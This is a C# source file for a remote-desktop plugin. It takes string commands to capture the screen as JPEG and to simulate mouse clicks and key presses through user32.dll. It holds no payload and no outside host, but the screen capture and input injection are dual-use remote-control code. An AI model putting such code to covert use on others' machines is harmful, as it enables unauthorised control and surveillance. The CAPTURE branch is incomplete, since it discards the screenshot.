using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using Shared;

namespace Plugins.RemoteDesktop
{
    public class RemoteDesktopPlugin : IPlugin
    {
        public string Name => "RemoteDesktop";
        public string Version => "1.0.0";

        private bool _isCapturing = false;
        private int _quality = 75;
        private int _monitor = 0;

        public void Execute(object[] parameters)
        {
            if (parameters == null || parameters.Length == 0)
                return;

            var command = parameters[0]?.ToString();

            switch (command)
            {
                case "START":
                    if (parameters.Length > 1) _quality = Convert.ToInt32(parameters[1]);
                    if (parameters.Length > 2) _monitor = Convert.ToInt32(parameters[2]);
                    _isCapturing = true;
                    break;

                case "STOP":
                    _isCapturing = false;
                    break;

                case "CAPTURE":
                    var screenshot = CaptureScreen();
                    // Return screenshot via callback or event
                    break;

                case "MOUSE_CLICK":
                    if (parameters.Length >= 3)
                    {
                        var x = Convert.ToInt32(parameters[1]);
                        var y = Convert.ToInt32(parameters[2]);
                        var rightClick = parameters.Length > 3 && Convert.ToBoolean(parameters[3]);
                        SimulateMouseClick(x, y, rightClick);
                    }
                    break;

                case "KEY_PRESS":
                    if (parameters.Length >= 2)
                    {
                        var keyCode = Convert.ToUInt16(parameters[1]);
                        SimulateKeyPress(keyCode);
                    }
                    break;
            }
        }

        private byte[] CaptureScreen()
        {
            try
            {
                var bounds = GetScreenBounds(_monitor);
                using var bitmap = new Bitmap(bounds.Width, bounds.Height);
                using var graphics = Graphics.FromImage(bitmap);
                
                graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);

                using var ms = new MemoryStream();
                var encoder = GetEncoder(ImageFormat.Jpeg);
                var encoderParams = new EncoderParameters(1);
                encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)_quality);
                
                bitmap.Save(ms, encoder, encoderParams);
                return ms.ToArray();
            }
            catch
            {
                return Array.Empty<byte>();
            }
        }

        private Rectangle GetScreenBounds(int monitor)
        {
            var screens = System.Windows.Forms.Screen.AllScreens;
            if (monitor >= 0 && monitor < screens.Length)
                return screens[monitor].Bounds;
            
            return System.Windows.Forms.Screen.PrimaryScreen.Bounds;
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            var codecs = ImageCodecInfo.GetImageDecoders();
            foreach (var codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                    return codec;
            }
            return null;
        }

        #region Mouse & Keyboard Simulation

        [DllImport("user32.dll")]
        private static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, UIntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        private static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int X, int Y);

        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        private const uint KEYEVENTF_KEYDOWN = 0x0000;
        private const uint KEYEVENTF_KEYUP = 0x0002;

        private void SimulateMouseClick(int x, int y, bool rightClick)
        {
            SetCursorPos(x, y);
            
            if (rightClick)
            {
                mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, UIntPtr.Zero);
                mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, UIntPtr.Zero);
            }
            else
            {
                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, UIntPtr.Zero);
                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, UIntPtr.Zero);
            }
        }

        private void SimulateKeyPress(ushort keyCode)
        {
            keybd_event((byte)keyCode, 0, KEYEVENTF_KEYDOWN, UIntPtr.Zero);
            keybd_event((byte)keyCode, 0, KEYEVENTF_KEYUP, UIntPtr.Zero);
        }

        #endregion
    }
}
